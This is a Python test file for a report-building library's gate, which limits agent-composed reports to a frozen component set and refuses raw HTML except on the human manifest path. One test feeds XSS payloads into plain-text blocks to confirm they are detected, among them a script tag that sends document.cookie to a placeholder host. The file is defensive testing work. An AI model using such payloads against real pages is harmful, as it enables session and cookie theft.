"""Tests for `report_fast.frozen` -- decision 10, enforced.

Run:      cd /home/jovyan/report_fast && python tests/test_frozen.py
Pytest:   pytest tests/test_frozen.py

The load-bearing test here is `test_the_frozen_set_is_still_design_md_s_table`.
Everything else is the mechanism; that one is the *rule*, and it is the reason the
table lives in a module instead of a paragraph -- a set that only exists in prose
is a set the code can quietly stop honoring.

The asymmetry is also tested on purpose, in both directions: `raw_html` must be
refused on the agent path and must keep working on the manifest path. A gate that
only knows how to say no would "fix" the first by breaking the second, and the
manifest tests would only notice when someone deleted a feature they liked.
"""

from __future__ import annotations

import ast
import os
import re
import sys

from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from report_fast.components import Bullets, Chart, Heading, LinkList, MetricTable, Prose  # noqa: E402
from report_fast.core import Report, Section  # noqa: E402
from report_fast.frozen import (  # noqa: E402
    DENIED_ON_AGENT_PATH,
    FROZEN,
    RAW_BLOCK_KEYS,
    Block,
    CompositionError,
    authorize,
    create,
    violations,
)

DESIGN = Path(__file__).resolve().parent.parent / "DESIGN.md"


def block(component, **kwargs):
    return Block(component, kwargs)


class _Raises:
    def __init__(self, expected):
        self.expected = expected
        self.exception: Exception | None = None

    def __enter__(self):
        return self

    def __exit__(self, exc_type, exc, tb):
        if exc is None:
            raise AssertionError(f"expected {self.expected.__name__} to be raised")
        if not isinstance(exc, self.expected):
            return False
        self.exception = exc
        return True


def raises(expected):
    return _Raises(expected)


# ── the set matches the document ────────────────────────────────────────────


def design_table_components() -> set:
    """The component names in DESIGN.md's component table (the `| `X` |` cells)."""
    text = DESIGN.read_text(encoding="utf-8")
    start = text.index("| Component | Renders")
    table = text[start : start + 3000]
    names = set()
    for cell in re.findall(r"^\|\s*([^|]+?)\s*\|", table, re.MULTILINE):
        if set(cell) <= {"-", " "}:  # the separator row
            continue
        # One cell holds "`Heading` / `Bullets`" because they are one row of the
        # document, so a cell is a list of names, not a name.
        names.update(re.findall(r"`([A-Za-z][\w]*)`", cell))
    assert names, "DESIGN.md's component table was not found -- did it get renamed?"
    return names


def test_the_frozen_set_is_still_design_md_s_table():
    documented = design_table_components()
    assert documented == set(FROZEN), (
        f"DESIGN.md documents {sorted(documented - set(FROZEN))} that the code does "
        f"not freeze, and the code freezes {sorted(set(FROZEN) - documented)} that "
        "DESIGN.md does not document. Decision 10 means one list, not two."
    )


def test_each_entry_is_the_component_its_name_says():
    assert FROZEN["Prose"] is Prose
    assert FROZEN["Heading"] is Heading
    assert FROZEN["Bullets"] is Bullets
    assert FROZEN["Chart"] is Chart
    assert FROZEN["MetricTable"] is MetricTable
    assert FROZEN["LinkList"] is LinkList
    assert FROZEN["Section"] is Section
    assert FROZEN["Report"] is Report


def test_every_frozen_name_imports_from_the_namespace_a_reader_reaches_for():
    """A trial run wrote `from report_fast.components import Section` and found
    nothing, because `Section` and `Report` live in `core` -- and the trial could
    not know that, since every *other* frozen name is in `components`.

    The set is taught as one list of ten, so it has to be importable as one list
    from the package named "components". `core` is where the two are defined and
    stays the canonical home; `components` re-exports them. The guard is over the
    whole set rather than the two names, so adding an eleventh somewhere else trips
    it too.
    """
    import report_fast
    import report_fast.components as components

    for name in sorted(FROZEN):
        assert hasattr(report_fast, name), f"{name} left the top-level surface"
        assert hasattr(components, name), (
            f"{name} is in the frozen set but not importable from report_fast.components"
        )
        assert getattr(components, name) is FROZEN[name], f"{name} is a different object"


def test_the_package_surface_offers_no_component_the_set_does_not():
    # `xOpatViewer` is a deprecated alias of SlideCard and `RawHtml` is the door;
    # neither may be reachable as a block name on this path.
    assert "xOpatViewer" not in FROZEN
    assert "RawHtml" not in set(FROZEN) - set(DENIED_ON_AGENT_PATH)


# ── the agent path ──────────────────────────────────────────────────────────


def test_raw_html_is_refused_and_says_what_to_do_instead():
    with raises(CompositionError) as raised:
        authorize([block("Prose", text="fine"), block("RawHtml", html="<b>x</b>")])
    message = str(raised.exception)
    assert "blocks[1]" in message, "the offending block is named by path"
    assert "manifest" in message, "the legitimate door is offered, not just the refusal"


def test_every_spelling_of_the_raw_door_is_refused():
    for key in sorted(RAW_BLOCK_KEYS):
        found = violations([block(key, html="<b>x</b>")])
        assert found and found[0].kind == "html", f"{key} walked through"
        with raises(CompositionError):
            authorize([block(key, html="<b>x</b>")])


def test_an_unknown_component_is_refused_rather_than_constructed():
    found = violations([block("Carousel", title="x")])
    assert found[0].kind == "component"
    assert "frozen component set" in found[0].message
    with raises(CompositionError):
        create(block("Carousel", title="x"))


def test_markup_smuggled_through_a_plain_text_block_is_found():
    for kwargs in (
        {"text": "<script>fetch('https://x/'+document.cookie)</script>"},
        {"paragraphs": ["perfectly normal", "<iframe src='//evil'></iframe>"]},
        {"items": ["a", "b", "<img src=x onerror=alert(1)>"]},
    ):
        found = violations([block("Prose", **kwargs)])
        assert found, f"{kwargs} produced no finding"
        assert found[0].kind == "html"
        assert "[" in found[0].path, "the path points inside the list, at the item"


def test_ordinary_clinical_prose_is_not_flagged():
    # A gate that cries at text is a gate that gets switched off. `<` shows up in
    # real copy ("ROI < 5 mm²", "p < 0.01") and none of it is markup.
    for text in (
        "The model's ROI < 5 mm² threshold gave p < 0.01 across the cohort.",
        "CE > H&E for this case; the H&E slide was re-scanned at 40x.",
        "Sensitivity was 0.86 -- see the confusion matrix in the run.",
    ):
        assert violations([block("Prose", text=text)]) == [], text


def test_a_clean_composition_builds_every_component():
    slide = {"data": ["/s/a.tif"], "background": [{"dataReference": 0}]}
    blocks = [
        block("Heading", text="Ductal carcinoma in situ"),
        block("Prose", text="Three cores, one section."),
        block("Bullets", items=["Grade 2", "ER positive"]),
        block("LinkList", links={"Run": "https://mlflow.test/#/runs/abc"}),
        block("MetricTable", metrics={"auc": 0.91}),
        block("Chart", image="", caption="ROC"),
        block("SlideGrid", sessions=[slide], min_width=280),
    ]
    authorize(blocks)  # does not raise
    built = [create(item) for item in blocks]
    assert [type(item).__name__ for item in built] == [
        "Heading",
        "Prose",
        "Bullets",
        "LinkList",
        "MetricTable",
        "Chart",
        "SlideGrid",
    ]


def test_nested_blocks_are_checked_at_their_full_path():
    # `Section` exists to group blocks, so nesting is the documented way to
    # structure a report -- and therefore the obvious place to hide a raw block
    # from a gate that only read the top level.
    hidden = [
        block("Heading", text="Findings"),
        block("Section", title="Details", blocks=[block("Prose", text="fine"), block("RawHtml", html="<b>x</b>")]),
    ]
    found = violations(hidden)
    assert [item.path for item in found] == ["blocks[1].blocks[1]"]
    with raises(CompositionError) as raised:
        authorize(hidden)
    assert "blocks[1].blocks[1]" in str(raised.exception)
    # ...at any depth, because a report nests.
    deep = [block("Section", title="a", blocks=[block("Section", title="b", blocks=[block("Carousel")])])]
    assert violations(deep)[0].path == "blocks[0].blocks[0].blocks[0]"


def test_a_section_builds_its_children_as_components():
    section = create(
        block("Section", title="Findings", blocks=[block("Prose", text="nested"), block("Bullets", items=["a"])])
    )
    assert [type(item).__name__ for item in section.blocks] == ["Prose", "Bullets"]
    assert "nested" in section.to_html()


def test_a_prebuilt_node_cannot_enter_through_a_frozen_component():
    # `_RawBlock`/`Report.add` stay for the Python path. What matters is that a
    # *spec* cannot reach them: the only constructor is `create`, and it only
    # knows the frozen table.
    from fasthtml.common import Div

    assert not any(getattr(cls, "component_type", "") == "raw-block" for cls in FROZEN.values())
    # A bad keyword is the door's own error now, with the signature in it, rather
    # than a bare `TypeError` from inside a component: the caller wrote a *spec*,
    # so it gets the vocabulary it wrote in. What has not changed is that the
    # component is not constructed -- check the message, not just the type.
    with raises(CompositionError) as raised:
        create(block("Prose", node=Div("x")))  # Prose takes no node
    assert "node" in str(raised.exception) and "Signature" in str(raised.exception)
    with raises(CompositionError):
        create(block("RawHtml", node=Div("x")))
    # A *nested* spec is checked the same way as a top-level one, whether it was
    # written as a dict or as a `Block`.
    for nested in ({"raw_html": "<b>x</b>"}, block("RawHtml", html="<b>x</b>")):
        with raises(CompositionError):
            create(block("Section", title="a", blocks=[nested]))


# ── the manifest path, which must keep working ──────────────────────────────


def test_a_manifest_may_still_use_raw_html():
    """The other half of the ruling, asserted so nobody "simplifies" it away.

    `authorize()` is not called anywhere on the manifest's path -- that absence
    *is* the decision -- and the door is the same one `test_components.py` has
    always exercised. Asserting it here rather than relying on that test to stay
    green: this is the half of decision 10 someone would delete by accident while
    "tightening" the gate.
    """
    import report_fast.build as build
    import report_fast.manifest as manifest

    for module in (manifest, build):
        tree = ast.parse(Path(module.__file__).read_text(encoding="utf-8"))
        imported = []
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                imported.extend(alias.name for alias in node.names)
            elif isinstance(node, ast.ImportFrom):
                prefix = f"{node.module}." if node.module else ""
                imported.extend(prefix + alias.name for alias in node.names)
        assert not any("frozen" in name for name in imported), (
            f"{module.__name__} now imports the frozen gate ({imported}). The "
            "manifest path must keep raw_html -- decision 10 allows it because a "
            "manifest is a human having touched a file"
        )

    # The real manifest door, not a hand-built RawHtml: the block key is what the
    # agent path refuses, and it still has to work here.
    spec = manifest.Spec(spec={}, path=Path("<test>"), base=Path.cwd())
    built = manifest._block({"raw_html": "<b>kept</b>"}, 0, spec)
    assert "<b>kept</b>" in built.to_html()
    assert violations([block("raw_html", html="<b>kept</b>")]), (
        "the door is still recognisable as a door to the gate that refuses it"
    )


def test_a_raw_string_on_the_python_path_is_escaped_not_injected():
    # `Report.add` takes a FastHTML tree; a bare string is text and gets escaped,
    # which is why `_RawBlock` alone is not a second HTML door and only `RawHtml`
    # (NotStr) is. Worth pinning: it is the reason the denied list is one name.
    built = Report(blocks=[])
    built.add("<b>kept</b>")
    html = built.to_html()
    assert "&lt;b&gt;kept&lt;/b&gt;" in html
    assert "<b>kept</b>" not in html


def test_raw_html_still_renders_on_the_python_path():
    from report_fast.components import RawHtml

    assert "<b>hi</b>" in RawHtml(html="<b>hi</b>").to_html()


if __name__ == "__main__":
    for name, function in sorted(globals().items()):
        if name.startswith("test_") and callable(function):
            function()
            print(f"ok  {name}")
